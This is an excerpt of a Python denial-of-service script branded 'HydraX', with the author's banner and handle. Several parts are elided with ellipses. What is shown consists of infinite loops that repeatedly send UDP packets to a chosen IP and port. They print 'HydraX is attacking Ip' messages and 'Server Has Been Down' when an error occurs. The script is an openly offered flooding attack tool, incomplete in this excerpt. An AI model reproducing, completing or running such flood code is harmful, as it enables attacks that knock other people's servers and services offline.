...
print("\033[92m>>> Coded : HydraX#3082") 
print("\033[92m>>>> Basta Si Hydrax#3082 Pogi <3")
    ...
    while True:
        try:
            ...
            for x in range(times):
                s.sendto(data,addr)
            print(i +"HydraX is attacking Ip %s And Port : %s"%(ip, port))
        except:
...
def run9():
    ...
    while True:
        try:
            ...
            for x in range(times):
                s.sendto(data,addr)
            print(i +"HydraX is attacking Ip %s Dan Port : %s"%(ip, port))
        except:
            print("Server Has Been Down")
